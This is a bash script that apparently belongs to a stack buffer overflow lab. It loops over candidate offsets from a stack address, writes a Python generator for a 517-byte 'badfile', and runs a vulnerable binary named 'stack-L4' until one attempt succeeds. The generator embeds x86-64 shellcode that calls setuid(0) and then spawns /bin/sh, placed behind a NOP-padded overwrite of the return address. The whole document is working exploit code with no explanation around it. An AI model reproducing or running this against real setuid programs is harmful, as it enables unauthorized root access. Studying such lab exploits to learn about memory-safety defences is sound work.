#!/bin/bash

echo "Trying different offsets from str address..."

for off in 0 20 40 60 80 100 120 140 160 180 200
do
    echo "======================================"
    echo "Trying str + $off"
    
    cat > exploit-L4.py << EOF
#!/usr/bin/python3
shellcode = (
    "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

content = bytearray(0x90 for i in range(517))
content[0:len(shellcode)] = shellcode

str_addr = 0x7fffffffd938
ret = str_addr + $off

content[18:26] = (ret).to_bytes(8, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)

print(f"Return address: 0x{ret:016x}")
EOF
    
    python3 exploit-L4.py
    timeout 2 ./stack-L4
    
    if [ \$? -eq 0 ]; then
        echo "SUCCESS at str + $off!"
        break
    fi
done